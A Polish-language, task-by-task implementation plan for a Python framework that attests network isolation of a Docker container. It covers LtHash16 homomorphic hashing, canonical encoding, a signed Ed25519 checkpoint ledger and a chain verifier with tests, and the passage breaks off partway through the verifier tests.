# Proof of Isolation — plan implementacji

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Framework `poi`, który uruchamia workload Dockera w izolacji sieciowej za logującym proxy i produkuje podpisany łańcuch checkpointów LtHash, pozwalający każdemu zweryfikować, że nic poza zgodnym ze schematem ruchem nie opuściło kontenera.

**Architecture:** Trzy akumulatory LtHash16 (stan, egress, ingress) aktualizowane deltami co tick. Stan pochodzi z `docker export`/`docker diff`, egress i ingress z WAL proxy mitmproxy (z DNS stubem). Każdy checkpoint jest podpisany Ed25519 i wskazuje poprzedni. Niezależny weryfikator odtwarza łańcuch, ponownie waliduje każde dozwolone żądanie względem polityki i (opcjonalnie) przelicza stan żywego kontenera.

**Tech Stack:** Python 3.12, numpy, cryptography (Ed25519), hashlib BLAKE2b, jsonschema, PyYAML, docker SDK, dnslib, mitmproxy (w kontenerze), pytest + hypothesis, uv.

**Spec:** `docs/superpowers/specs/2026-10-13-proof-of-isolation-design.md` (szczególnie §12 — korekty po prototypie).

**Uwaga o pochodzeniu kodu:** cały kod w tym planie został uruchomiony w prototypie na docelowym hoście (Docker 29, containerd store): 88 testów jednostkowych i 5 testów `docker` przechodzi. Przepisuj go dosłownie; jeśli coś nie przechodzi, najpierw sprawdź, czy plik został skopiowany w całości.


## Global Constraints

- Python `>=3.12`; zależności: `numpy>=1.26`, `cryptography>=42`, `jsonschema>=4.21`, `pyyaml>=6`, `docker>=7`, `dnslib>=0.9.24`; dev: `pytest>=8`, `hypothesis>=6.100`, `pyflakes>=3`; proxy (tylko w obrazie): `mitmproxy>=11,<13`.
- Środowisko: `uv venv --python 3.12 .venv`; wszystkie komendy przez `.venv/bin/...`. Układ `src/` (pakiet `poi`), testy w `tests/` importują wspólne buildery przez `from helpers import ...`.
- LtHash16: n = 1024 × uint16 little-endian (2048 B), arytmetyka mod 2¹⁶; expand = 32 bloki `blake2b(i.to_bytes(4,'big') ‖ e, digest_size=64, person=b"poi-lthash-v1")`; digest = `blake2b(vec, digest_size=32, person=b"poi-digest-v1")`.
- Skrót treści wszędzie: BLAKE2b-256 hex bez personalizacji (`canonical.b2b256`). Kanoniczny JSON: posortowane klucze, separatory `,` `:`, UTF-8.
- Elementy: pola łączone bajtem `\0`; NUL w polu = `ValueError`. Domeny: `file`, `config`, `egress`, `dns`, `ingress`.
- Kody wyjścia weryfikatora: 10 podpis, 11 łańcuch/czas, 12 delta/suma LtHash, 13 `seq`/`count`, 14 schemat, 15 config/polityka, 16 evidence, 17 `--live`.
- Układ katalogu przebiegu: `policy.yaml`, `pubkey`, `ledger/NNNNNN.json`, `delta/NNNNNN.jsonl`, `evidence/<b2b256>.bin`, `proxy-wal/events.jsonl`, `ca/`, `out/`, `heads.jsonl`, `runtime.json`.
- Docker: tylko grupa `docker` (bez roota); obraz proxy `poi-proxy:0.1`; podsieć wewnętrzna `10.231.X.0/24`, proxy `.2:8080`, DNS stub na `.2:53`.
- Proxy fail-closed: brak zapisu do WAL ⇒ blokada. Proxy wysyła tylko `content-type: application/json` + `forward_headers` i kanoniczne body.
- Testy wymagające Dockera mają marker `docker`; `pytest -m "not docker"` musi działać bez Dockera.
- Commity kończą się linią `Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>`.


---

### Task 1: Szkielet projektu i LtHash16

Pakiet `poi` instalowalny przez uv; homomorficzny hasz LtHash16 z testami własności i wektorami golden.

**Files:**
- Create: `pyproject.toml`
- Create: `.gitignore`
- Create: `src/poi/__init__.py`
- Create: `tests/conftest.py`
- Create: `src/poi/lthash.py`
- Test: `tests/test_lthash.py`

**Interfaces:**
- Consumes: —
- Produces: `poi.lthash.N = 1024`, `VEC_BYTES = 2048`, `expand(element: bytes) -> np.ndarray[uint16]`, klasa `LtHash` z `of(iterable[bytes])`, `add(bytes) -> self`, `sub(bytes) -> self`, `+`, `-`, `==`, `copy()`, `to_bytes()/from_bytes()`, `to_b64()/from_b64()`, `digest() -> str` (hex 64). `tests/conftest.py` daje fixture `key` (Ed25519PrivateKey).

- [ ] **Step 1: Utwórz pliki projektu**

Utwórz `pyproject.toml`:

```toml
[build-system]
requires = ["hatchling"]
build-backend = "hatchling.build"

[project]
name = "poi"
version = "0.1.0"
description = "Proof of Isolation: homomorphic-hash attestation that data does not leave a Docker container"
requires-python = ">=3.12"
dependencies = [
  "numpy>=1.26",
  "cryptography>=42",
  "jsonschema>=4.21",
  "pyyaml>=6",
  "docker>=7",
  "dnslib>=0.9.24",
]

[project.optional-dependencies]
proxy = ["mitmproxy>=11"]
dev = ["pytest>=8", "hypothesis>=6.100", "pyflakes>=3"]

[project.scripts]
poi = "poi.cli:main"

[tool.hatch.build.targets.wheel]
packages = ["src/poi"]

[tool.pytest.ini_options]
testpaths = ["tests"]
markers = ["docker: requires a running Docker daemon (deselect with -m 'not docker')"]
```

Utwórz `.gitignore`:

```text
.venv/
__pycache__/
*.egg-info/
.pytest_cache/
.hypothesis/
run/
```

Utwórz `src/poi/__init__.py`:

```python
"""Proof of Isolation."""
```

Utwórz `tests/conftest.py`:

```python
import pytest
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey


@pytest.fixture
def key():
    return Ed25519PrivateKey.generate()
```

- [ ] **Step 2: Utwórz środowisko**

```bash
uv venv --python 3.12 .venv
uv pip install --python .venv/bin/python -e '.[dev]'
```
Expected: instalacja kończy się bez błędów (`numpy`, `cryptography`, `jsonschema`, `pyyaml`, `docker`, `dnslib`, `pytest`, `hypothesis`).

- [ ] **Step 3: Napisz testy (najpierw muszą nie przechodzić)**

Utwórz `tests/test_lthash.py`:

```python
from hypothesis import given, strategies as st

from poi.lthash import LtHash, N, VEC_BYTES, expand

elems = st.lists(st.binary(max_size=64), max_size=20)


def test_expand_shape_and_determinism():
    v = expand(b"hello")
    assert v.shape == (N,)
    assert (v == expand(b"hello")).all()
    assert not (v == expand(b"hellp")).all()


def test_empty_is_zero():
    assert LtHash().to_bytes() == bytes(VEC_BYTES)


@given(elems, elems)
def test_union_is_sum(a, b):
    assert LtHash.of(a + b) == LtHash.of(a) + LtHash.of(b)


@given(elems)
def test_order_independent(a):
    assert LtHash.of(a) == LtHash.of(list(reversed(a)))


@given(elems)
def test_sub_inverts_add(a):
    h = LtHash.of(a)
    for e in a:
        h.sub(e)
    assert h == LtHash()


@given(elems)
def test_roundtrip_b64(a):
    h = LtHash.of(a)
    assert LtHash.from_b64(h.to_b64()) == h


def test_golden_vectors():
    # Fixed vectors so independent implementations can cross-check.
    assert expand(b"").tobytes()[:8].hex() == GOLDEN_EXPAND_EMPTY_PREFIX
    assert LtHash.of([b"a", b"b"]).digest() == GOLDEN_DIGEST_AB
    assert LtHash().digest() == GOLDEN_DIGEST_EMPTY


GOLDEN_EXPAND_EMPTY_PREFIX = "96fb02154f98d8f1"
GOLDEN_DIGEST_AB = "62ad48880b6b900e906dea44e4d66b6d2fd2241aaf3da00f7fafda3588ee3fdc"
GOLDEN_DIGEST_EMPTY = "8d1d92b5b93941980d6780a1b566c67c5431d195ed33cccad74a60edd80513a4"
```

- [ ] **Step 4: Uruchom testy — oczekiwany FAIL**

Run: `.venv/bin/pytest tests/test_lthash.py -v`
Expected: ERROR collecting — `ModuleNotFoundError: No module named 'poi.lthash'`

- [ ] **Step 5: Implementacja**

Utwórz `src/poi/lthash.py`:

```python
"""LtHash16: additive homomorphic multiset hash (Lewi et al., 2019) over BLAKE2b."""
from __future__ import annotations

import base64
import hashlib

import numpy as np

N = 1024                      # coordinates
VEC_BYTES = N * 2             # 2048 bytes
_BLOCKS = VEC_BYTES // 64     # 32 BLAKE2b-512 blocks
_PERSON_EXPAND = b"poi-lthash-v1"
_PERSON_DIGEST = b"poi-digest-v1"


def expand(element: bytes) -> np.ndarray:
    """Map an element to a pseudo-random vector of 1024 uint16 (BLAKE2b counter mode)."""
    out = bytearray()
    for i in range(_BLOCKS):
        out += hashlib.blake2b(
            i.to_bytes(4, "big") + element, digest_size=64, person=_PERSON_EXPAND
        ).digest()
    return np.frombuffer(bytes(out), dtype="<u2").copy()


class LtHash:
    """Value object: sum of expanded elements mod 2**16."""

    __slots__ = ("vec",)

    def __init__(self, vec: np.ndarray | None = None) -> None:
        if vec is None:
            vec = np.zeros(N, dtype="<u2")
        if vec.shape != (N,) or vec.dtype != np.dtype("<u2"):
            raise ValueError("LtHash vector must be 1024 little-endian uint16")
        self.vec = vec

    @classmethod
    def of(cls, elements) -> "LtHash":
        h = cls()
        for e in elements:
            h.add(e)
        return h

    def add(self, element: bytes) -> "LtHash":
        self.vec += expand(element)  # uint16 arithmetic wraps mod 2**16
        return self

    def sub(self, element: bytes) -> "LtHash":
        self.vec -= expand(element)
        return self

    def __add__(self, other: "LtHash") -> "LtHash":
        return LtHash(self.vec + other.vec)

    def __sub__(self, other: "LtHash") -> "LtHash":
        return LtHash(self.vec - other.vec)

    def __eq__(self, other: object) -> bool:
        return isinstance(other, LtHash) and bool(np.array_equal(self.vec, other.vec))

    def copy(self) -> "LtHash":
        return LtHash(self.vec.copy())

    def to_bytes(self) -> bytes:
        return self.vec.astype("<u2").tobytes()

    @classmethod
    def from_bytes(cls, data: bytes) -> "LtHash":
        if len(data) != VEC_BYTES:
            raise ValueError(f"expected {VEC_BYTES} bytes, got {len(data)}")
        return cls(np.frombuffer(data, dtype="<u2").copy())

    def to_b64(self) -> str:
        return base64.b64encode(self.to_bytes()).decode("ascii")

    @classmethod
    def from_b64(cls, s: str) -> "LtHash":
        return cls.from_bytes(base64.b64decode(s, validate=True))

    def digest(self) -> str:
        return hashlib.blake2b(self.to_bytes(), digest_size=32, person=_PERSON_DIGEST).hexdigest()
```

- [ ] **Step 6: Uruchom testy — oczekiwany PASS**

Run: `.venv/bin/pytest tests/test_lthash.py -v`
Expected: wszystkie testy PASS.

- [ ] **Step 7: Commit**

```bash
git add .gitignore pyproject.toml src/poi/__init__.py src/poi/lthash.py tests/conftest.py tests/test_lthash.py
git commit -m "feat: project skeleton and LtHash16 homomorphic hash

Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```


### Task 2: Kodowanie kanoniczne i magazyn evidence

Jedno źródło prawdy dla bajtów elementów (§5.2), kanonicznego JSON, skrótów checkpointów i przechowywania treści.

**Files:**
- Create: `src/poi/canonical.py`
- Create: `src/poi/evidence.py`
- Test: `tests/test_canonical.py`
- Test: `tests/test_evidence.py`

**Interfaces:**
- Consumes: —
- Produces (`poi.canonical`): `b2b256(bytes)->str`, `canonical_json(obj)->bytes`, `encode(domain,*fields)->bytes`, `decode(bytes)->list[str]`, `file_element(path, ftype, mode, uid, gid, content)`, `config_element(digest)`, `egress_element(seq, t, method, host, path, headers_digest, body_digest, verdict, reason)`, `dns_element(seq, t, name, qtype, verdict)`, `ingress_element(seq, status, headers_digest, body_digest)`, `headers_digest(list[tuple[str,str]])`, `checkpoint_signing_bytes(cp)`, `checkpoint_digest(cp)`. Pola po `decode`: egress `[egress, seq, t, method, host, path, hdig, bdig, verdict, reason]`, dns `[dns, seq, t, name, qtype, verdict]`, ingress `[ingress, seq, status, hdig, bdig]`.
- Produces (`poi.evidence`): `put(dir, data)->digest`, `get(dir, digest)->bytes|None` (None także gdy treść nie zgadza się ze skrótem).

- [ ] **Step 1: Napisz testy (najpierw muszą nie przechodzić)**

Utwórz `tests/test_canonical.py`:

```python
import pytest

from poi import canonical as c


def test_canonical_json_is_deterministic():
    assert c.canonical_json({"b": 1, "a": [1, {"d": 2, "c": 3}]}) == b'{"a":[1,{"c":3,"d":2}],"b":1}'


def test_domain_separation():
    assert c.encode("file", "x") != c.encode("egress", "x")
    assert c.file_element("/a", "file", 0o644, 0, 0, "aa") != c.egress_element(
        0, "/a", "file", "644", "0", "0", "aa", "allow", "")


def test_file_element_layout():
    assert c.file_element("/etc/x", "file", 0o100644, 0, 0, "ab") == b"\x00".join(
        [b"file", b"/etc/x", b"file", b"644", b"0", b"0", b"ab"])


def test_nul_rejected():
    with pytest.raises(ValueError):
        c.encode("file", "a\0b")


def test_decode_roundtrip():
    e = c.egress_element(7, "2026-01-01T00:00:00Z", "POST", "api.x", "/v1", "h", "b", "block", "schema")
    assert c.decode(e) == ["egress", "7", "2026-01-01T00:00:00Z", "POST", "api.x", "/v1", "h", "b", "block", "schema"]


def test_headers_digest_order_and_case_insensitive():
    assert c.headers_digest([("A", "1"), ("b", "2")]) == c.headers_digest([("B", "2"), ("a", "1")])


def test_checkpoint_digest_ignores_sig():
    cp = {"seq": 1, "x": "y", "sig": "aa"}
    assert c.checkpoint_digest(cp) == c.checkpoint_digest({**cp, "sig": "bb"})
```

Utwórz `tests/test_evidence.py`:

```python
from poi import evidence
from poi.canonical import b2b256


def test_put_get_roundtrip(tmp_path):
    d = evidence.put(tmp_path, b"body")
    assert d == b2b256(b"body")
    assert evidence.get(tmp_path, d) == b"body"
    assert evidence.put(tmp_path, b"body") == d          # idempotent


def test_missing_and_corrupt_return_none(tmp_path):
    assert evidence.get(tmp_path, "0" * 64) is None
    d = evidence.put(tmp_path, b"body")
    (tmp_path / f"{d}.bin").write_bytes(b"tampered")
    assert evidence.get(tmp_path, d) is None
```

- [ ] **Step 2: Uruchom testy — oczekiwany FAIL**

Run: `.venv/bin/pytest tests/test_canonical.py tests/test_evidence.py -v`
Expected: ERROR collecting — `ModuleNotFoundError: No module named 'poi.canonical'`

- [ ] **Step 3: Implementacja**

Utwórz `src/poi/canonical.py`:

```python
"""Canonical byte encodings shared by every component (daemon, proxy, verifier)."""
from __future__ import annotations

import hashlib
import json
from typing import Any

SEP = b"\0"


def b2b256(data: bytes) -> str:
    """Hex BLAKE2b-256 used for content digests everywhere in poi."""
    return hashlib.blake2b(data, digest_size=32).hexdigest()


def canonical_json(obj: Any) -> bytes:
    """Deterministic JSON: sorted keys, no whitespace, UTF-8."""
    return json.dumps(obj, sort_keys=True, separators=(",", ":"), ensure_ascii=False).encode("utf-8")


def _field(v: str | int) -> bytes:
    b = str(v).encode("utf-8")
    if SEP in b:
        raise ValueError(f"field contains NUL: {v!r}")
    return b


def encode(domain: str, *fields: str | int) -> bytes:
    return SEP.join([_field(domain), *(_field(f) for f in fields)])


def decode(element: bytes) -> list[str]:
    return element.decode("utf-8").split("\0")


# --- element constructors (spec §5.2) ---------------------------------------

def file_element(path: str, ftype: str, mode: int, uid: int, gid: int, content: str) -> bytes:
    """ftype: file|dir|symlink|special. content: digest (file), link target (symlink), '' otherwise."""
    return encode("file", path, ftype, format(mode & 0o7777, "o"), uid, gid, content)


def config_element(config_digest: str) -> bytes:
    return encode("config", config_digest)


def egress_element(seq: int, t: str, method: str, host: str, path: str,
                   headers_digest: str, body_digest: str, verdict: str, reason: str) -> bytes:
    return encode("egress", seq, t, method, host, path, headers_digest, body_digest, verdict, reason)


def dns_element(seq: int, t: str, name: str, qtype: str, verdict: str) -> bytes:
    return encode("dns", seq, t, name, qtype, verdict)


def ingress_element(seq: int, status: int, headers_digest: str, body_digest: str) -> bytes:
    return encode("ingress", seq, status, headers_digest, body_digest)


def headers_digest(headers: list[tuple[str, str]]) -> str:
    """Order-independent, case-normalised digest of HTTP headers."""
    norm = sorted((k.lower(), v) for k, v in headers)
    return b2b256(canonical_json(norm))


# --- checkpoints -------------------------------------------------------------

def checkpoint_signing_bytes(cp: dict) -> bytes:
    """Bytes covered by the signature and by the next checkpoint's `prev`."""
    return canonical_json({k: v for k, v in cp.items() if k != "sig"})


def checkpoint_digest(cp: dict) -> str:
    return b2b256(checkpoint_signing_bytes(cp))
```

Utwórz `src/poi/evidence.py`:

```python
"""Content-addressed store for raw bytes (request/response bodies, config JSON)."""
from __future__ import annotations

import os
from pathlib import Path

from poi.canonical import b2b256


def put(evidence_dir: Path, data: bytes) -> str:
    digest = b2b256(data)
    path = Path(evidence_dir) / f"{digest}.bin"
    if not path.exists():
        tmp = path.with_suffix(f".tmp{os.getpid()}")
        with open(tmp, "wb") as f:
            f.write(data)
            f.flush()
            os.fsync(f.fileno())
        os.replace(tmp, path)
    return digest


def get(evidence_dir: Path, digest: str) -> bytes | None:
    """Return stored bytes, or None if missing or corrupted."""
    path = Path(evidence_dir) / f"{digest}.bin"
    try:
        data = path.read_bytes()
    except FileNotFoundError:
        return None
    return data if b2b256(data) == digest else None
```

- [ ] **Step 4: Uruchom testy — oczekiwany PASS**

Run: `.venv/bin/pytest tests/test_canonical.py tests/test_evidence.py -v`
Expected: wszystkie testy PASS.

- [ ] **Step 5: Commit**

```bash
git add src/poi/canonical.py src/poi/evidence.py tests/test_canonical.py tests/test_evidence.py
git commit -m "feat: canonical element encoding and evidence store

Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```


### Task 3: Ledger: podpisany łańcuch checkpointów

Zapis delt i checkpointów (§6.1–6.2) z podpisem Ed25519, łańcuchem `prev` i rotacją klucza.

**Files:**
- Create: `src/poi/ledger.py`
- Create: `tests/helpers.py`
- Test: `tests/test_ledger.py`

**Interfaces:**
- Consumes: `poi.canonical.*`, `poi.lthash.LtHash`
- Produces: `generate_key(path)->pub_hex` (plik 0600 + `<path>.pub`), `load_key(path)`, `pubkey_hex(key)`, `DeltaOp(op, acc, element)` z `to_json()/from_json()`, `delta_bytes(ops)`, `Ledger(run_dir, key)` z atrybutami `ledger_dir`, `delta_dir`, `evidence_dir`, metodami `last()->dict|None`, `read_delta(seq)->list[DeltaOp]`, `append(*, t, container, policy_digest, accs: dict[str,LtHash], counts: dict[str,int], ops, restart=False, rotate_to=None)->dict`.
- Produces (testy): `tests/helpers.py` z `T0`, `egress(seq, verdict='allow', body_digest=...)`, `make_run(tmp_path, key, n_egress=(2,1))->Ledger`.

- [ ] **Step 1: Napisz testy (najpierw muszą nie przechodzić)**

Utwórz `tests/helpers.py`:

```python
"""Shared builders for tests."""
from pathlib import Path

from poi import canonical as c
from poi.ledger import DeltaOp, Ledger
from poi.lthash import LtHash

T0 = "2026-10-13T18:00:00Z"


def egress(seq, verdict="allow", body_digest="b" * 64):
    return c.egress_element(seq, T0, "POST", "api.example.com", "/v1/score",
                            "h" * 64, body_digest, verdict, "" if verdict == "allow" else "schema")


def make_run(tmp_path: Path, key, n_egress=(2, 1)):
    """Build a small valid run: genesis with 2 files + config, then ticks with egress events."""
    led = Ledger(tmp_path, key)
    accs = {a: LtHash() for a in ("state", "egress", "ingress")}
    counts = {"egress": 0, "ingress": 0}
    f1 = c.file_element("/etc/a", "file", 0o644, 0, 0, "1" * 64)
    f2 = c.file_element("/etc/b", "file", 0o644, 0, 0, "2" * 64)
    cfg = c.config_element("c" * 64)
    ops = [DeltaOp("add", "state", e) for e in (f1, f2, cfg)]
    for op in ops:
        accs["state"].add(op.element)
    container = {"id": "abc", "image": "sha256:" + "0" * 64}
    led.append(t=T0, container=container, policy_digest="p" * 64, accs=accs, counts=counts, ops=ops)
    for i, n in enumerate(n_egress):
        ops = []
        f2new = c.file_element("/etc/b", "file", 0o644, 0, 0, str(i) * 64)
        ops += [DeltaOp("sub", "state", f2), DeltaOp("add", "state", f2new)]
        accs["state"].sub(f2).add(f2new)
        f2 = f2new
        for _ in range(n):
            counts["egress"] += 1
            e = egress(counts["egress"])
            ing = c.ingress_element(counts["egress"], 200, "h" * 64, "r" * 64)
            ops += [DeltaOp("add", "egress", e), DeltaOp("add", "ingress", ing)]
            accs["egress"].add(e)
            accs["ingress"].add(ing)
            counts["ingress"] += 1
        led.append(t=f"2026-10-13T18:00:0{i + 1}Z", container=container, policy_digest="p" * 64,
                   accs=accs, counts=counts, ops=ops)
    return led
```

Utwórz `tests/test_ledger.py`:

```python
import json
import os
import stat

from poi import canonical as c
from poi.ledger import generate_key, load_key, pubkey_hex

from helpers import make_run


def test_generate_and_load_key(tmp_path):
    p = tmp_path / "k"
    pub = generate_key(p)
    assert stat.S_IMODE(os.stat(p).st_mode) == 0o600
    assert pubkey_hex(load_key(p)) == pub
    assert (tmp_path / "k.pub").read_text().strip() == pub


def test_chain_links_and_files(tmp_path, key):
    led = make_run(tmp_path, key)
    cps = [json.loads(p.read_bytes()) for p in sorted((tmp_path / "ledger").glob("*.json"))]
    assert [cp["seq"] for cp in cps] == [0, 1, 2]
    assert cps[0]["prev"] is None
    assert cps[1]["prev"] == c.checkpoint_digest(cps[0])
    assert cps[2]["egress"]["count"] == 3
    assert (tmp_path / "pubkey").read_text().strip() == pubkey_hex(key)
    assert len(led.read_delta(1)) == 2 + 2 * 2


def test_signature_valid(tmp_path, key):
    make_run(tmp_path, key)
    cp = json.loads((tmp_path / "ledger" / "000001.json").read_bytes())
    key.public_key().verify(bytes.fromhex(cp["sig"]), c.checkpoint_signing_bytes(cp))
```

- [ ] **Step 2: Uruchom testy — oczekiwany FAIL**

Run: `.venv/bin/pytest tests/test_ledger.py -v`
Expected: ERROR collecting — `ModuleNotFoundError: No module named 'poi.ledger'`

- [ ] **Step 3: Implementacja**

Utwórz `src/poi/ledger.py`:

```python
"""Append-only, signed chain of checkpoints with per-checkpoint delta files."""
from __future__ import annotations

import base64
import json
import os
from dataclasses import dataclass
from pathlib import Path

from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat

from poi.canonical import b2b256, canonical_json, checkpoint_digest, checkpoint_signing_bytes
from poi.lthash import LtHash

ACCS = ("state", "egress", "ingress")


def pubkey_hex(key: Ed25519PrivateKey) -> str:
    return key.public_key().public_bytes(Encoding.Raw, PublicFormat.Raw).hex()


def generate_key(path: Path) -> str:
    """Write a raw 32-byte Ed25519 private key (0600) and `<path>.pub` (hex). Returns pubkey hex."""
    path = Path(path)
    key = Ed25519PrivateKey.generate()
    fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
    with os.fdopen(fd, "wb") as f:
        f.write(key.private_bytes_raw())
    pub = pubkey_hex(key)
    path.with_name(path.name + ".pub").write_text(pub + "\n")
    return pub


def load_key(path: Path) -> Ed25519PrivateKey:
    return Ed25519PrivateKey.from_private_bytes(Path(path).read_bytes())


@dataclass
class DeltaOp:
    op: str        # "add" | "sub"
    acc: str       # "state" | "egress" | "ingress"
    element: bytes

    def to_json(self) -> dict:
        return {"op": self.op, "acc": self.acc, "element": base64.b64encode(self.element).decode("ascii")}

    @classmethod
    def from_json(cls, d: dict) -> "DeltaOp":
        return cls(d["op"], d["acc"], base64.b64decode(d["element"], validate=True))


def _write_atomic(path: Path, data: bytes) -> None:
    tmp = path.with_suffix(path.suffix + ".tmp")
    with open(tmp, "wb") as f:
        f.write(data)
        f.flush()
        os.fsync(f.fileno())
    os.replace(tmp, path)


def delta_bytes(ops: list[DeltaOp]) -> bytes:
    return b"".join(canonical_json(op.to_json()) + b"\n" for op in ops)


class Ledger:
    def __init__(self, run_dir: Path, key: Ed25519PrivateKey) -> None:
        self.run_dir = Path(run_dir)
        self.key = key
        self.ledger_dir = self.run_dir / "ledger"
        self.delta_dir = self.run_dir / "delta"
        self.evidence_dir = self.run_dir / "evidence"
        for d in (self.ledger_dir, self.delta_dir, self.evidence_dir):
            d.mkdir(parents=True, exist_ok=True)
        pub = self.run_dir / "pubkey"
        if not pub.exists():
            pub.write_text(pubkey_hex(key) + "\n")

    def last(self) -> dict | None:
        files = sorted(self.ledger_dir.glob("*.json"))
        return json.loads(files[-1].read_bytes()) if files else None

    def read_delta(self, seq: int) -> list[DeltaOp]:
        lines = (self.delta_dir / f"{seq:06d}.jsonl").read_bytes().splitlines()
        return [DeltaOp.from_json(json.loads(line)) for line in lines if line]

    def append(self, *, t: str, container: dict, policy_digest: str,
               accs: dict[str, LtHash], counts: dict[str, int], ops: list[DeltaOp],
               restart: bool = False, rotate_to: Ed25519PrivateKey | None = None) -> dict:
        prev = self.last()
        seq = 0 if prev is None else prev["seq"] + 1
        dbytes = delta_bytes(ops)
        _write_atomic(self.delta_dir / f"{seq:06d}.jsonl", dbytes)
        cp = {
            "v": 1,
            "seq": seq,
            "t": t,
            "prev": None if prev is None else checkpoint_digest(prev),
            "container": container,
            "policy": policy_digest,
            "state": {"vec": accs["state"].to_b64(), "digest": accs["state"].digest()},
            "egress": {"vec": accs["egress"].to_b64(), "digest": accs["egress"].digest(),
                       "count": counts["egress"]},
            "ingress": {"vec": accs["ingress"].to_b64(), "digest": accs["ingress"].digest(),
                        "count": counts["ingress"]},
            "delta": b2b256(dbytes),
            "restart": restart,
        }
        if rotate_to is not None:
            cp["rotate"] = pubkey_hex(rotate_to)
        cp["sig"] = self.key.sign(checkpoint_signing_bytes(cp)).hex()
        _write_atomic(self.ledger_dir / f"{seq:06d}.json", canonical_json(cp))
        if rotate_to is not None:
            self.key = rotate_to
        return cp
```

- [ ] **Step 4: Uruchom testy — oczekiwany PASS**

Run: `.venv/bin/pytest tests/test_ledger.py -v`
Expected: wszystkie testy PASS.

- [ ] **Step 5: Commit**

```bash
git add src/poi/ledger.py tests/helpers.py tests/test_ledger.py
git commit -m "feat: signed append-only checkpoint ledger

Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```


### Task 4: Weryfikator łańcucha (kody 10–13)

Niezależne odtworzenie łańcucha od genesis: podpisy, `prev`, czas, sumy LtHash z delt, ciągłość `seq` i `count`.

**Files:**
- Create: `src/poi/verify.py`
- Test: `tests/test_verify_chain.py`

**Interfaces:**
- Consumes: `poi.canonical`, `poi.lthash` (NIE importuje `poi.ledger` — weryfikator jest niezależny)
- Produces: stałe `E_SIGNATURE=10, E_CHAIN=11, E_DELTA=12, E_SEQ=13, E_SCHEMA=14, E_CONFIG=15, E_EVIDENCE=16, E_LIVE=17`; `VerifyError(code, seq, msg)`; `Event(checkpoint, fields)` z `.domain`, `.seq`; `VerifyResult` z `checkpoints`, `accs`, `state_elements`, `egress`, `ingress`, `config_digests: list[(cp_seq, digest)]`, `.last`; `verify_chain(run_dir, pubkey_hex) -> VerifyResult`.

- [ ] **Step 1: Napisz testy (najpierw muszą nie przechodzić)**

Utwórz `tests/test_verify_chain.py`:

```python
import json

import pytest
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey

from poi import canonical as c
from poi.ledger import DeltaOp, pubkey_hex
from poi.verify import (E_CHAIN, E_DELTA, E_SEQ, E_SIGNATURE, VerifyError, verify_chain)

from helpers import egress, make_run


def _rewrite(path, mutate):
    cp = json.loads(path.read_bytes())
    mutate(cp)
    path.write_bytes(c.canonical_json(cp))


def _expect(tmp_path, key, code):
    with pytest.raises(VerifyError) as ei:
        verify_chain(tmp_path, pubkey_hex(key))
    assert ei.value.code == code, str(ei.value)


def test_valid_run_verifies(tmp_path, key):
    make_run(tmp_path, key)
    res = verify_chain(tmp_path, pubkey_hex(key))
    assert len(res.checkpoints) == 3
    assert [e.seq for e in res.egress] == [1, 2, 3]
    assert res.accs["state"].digest() == res.last["state"]["digest"]
    assert res.config_digests == [(0, "c" * 64)]


def test_wrong_key_fails_signature(tmp_path, key):
    make_run(tmp_path, key)
    with pytest.raises(VerifyError) as ei:
        verify_chain(tmp_path, pubkey_hex(Ed25519PrivateKey.generate()))
    assert ei.value.code == E_SIGNATURE


def test_modified_checkpoint_field_fails_signature(tmp_path, key):
    make_run(tmp_path, key)
    _rewrite(tmp_path / "ledger" / "000001.json", lambda cp: cp.update(t="2026-10-13T18:00:05Z"))
    _expect(tmp_path, key, E_SIGNATURE)


def test_resigned_tampered_vector_fails_delta(tmp_path, key):
    make_run(tmp_path, key)

    def mutate(cp):
        cp["state"]["vec"] = cp["state"]["vec"][:-4] + ("AAA=" if cp["state"]["vec"][-4:] != "AAA=" else "AQA=")
        cp["sig"] = key.sign(c.checkpoint_signing_bytes(cp)).hex()

    _rewrite(tmp_path / "ledger" / "000002.json", mutate)
    _expect(tmp_path, key, E_DELTA)


def test_modified_delta_byte_fails(tmp_path, key):
    make_run(tmp_path, key)
    p = tmp_path / "delta" / "000001.jsonl"
    raw = bytearray(p.read_bytes())
    raw[-3] ^= 1
    p.write_bytes(bytes(raw))
    _expect(tmp_path, key, E_DELTA)


def test_deleted_checkpoint_fails_chain(tmp_path, key):
    make_run(tmp_path, key)
    (tmp_path / "ledger" / "000001.json").unlink()
    _expect(tmp_path, key, E_CHAIN)


def test_swapped_checkpoints_fail_chain(tmp_path, key):
    make_run(tmp_path, key)
    a, b = tmp_path / "ledger" / "000001.json", tmp_path / "ledger" / "000002.json"
    da, db = a.read_bytes(), b.read_bytes()
    a.write_bytes(db)
    b.write_bytes(da)
    _expect(tmp_path, key, E_CHAIN)


def test_seq_gap_fails(tmp_path, key):
    led = make_run(tmp_path, key, n_egress=(1,))
    res = verify_chain(tmp_path, pubkey_hex(key))
    accs = {k: v.copy() for k, v in res.accs.items()}
    e = egress(3)  # skips seq 2
    accs["egress"].add(e)
    led.append(t="2026-10-13T18:00:09Z", container=res.last["container"], policy_digest="p" * 64,
               accs=accs, counts={"egress": 2, "ingress": 1}, ops=[DeltaOp("add", "egress", e)])
    _expect(tmp_path, key, E_SEQ)


def test_egress_sub_rejected(tmp_path, key):
    led = make_run(tmp_path, key, n_egress=(1,))
    res = verify_chain(tmp_path, pubkey_hex(key))
    e = egress(1)
    accs = {k: v.copy() for k, v in res.accs.items()}
    accs["egress"].sub(e)
    led.append(t="2026-10-13T18:00:09Z", container=res.last["container"], policy_digest="p" * 64,
               accs=accs, counts={"egress": 1, "ingress": 1}, ops=[DeltaOp("sub", "egress", e)])
    _expect(tmp_path, key, E_SEQ)


def test_key_rotation(tmp_path, key):
    led = make_run(tmp_path, key, n_egress=(1,))
    new = Ed25519PrivateKey.generate()
    res = verify_chain(tmp_path, pubkey_hex(key))
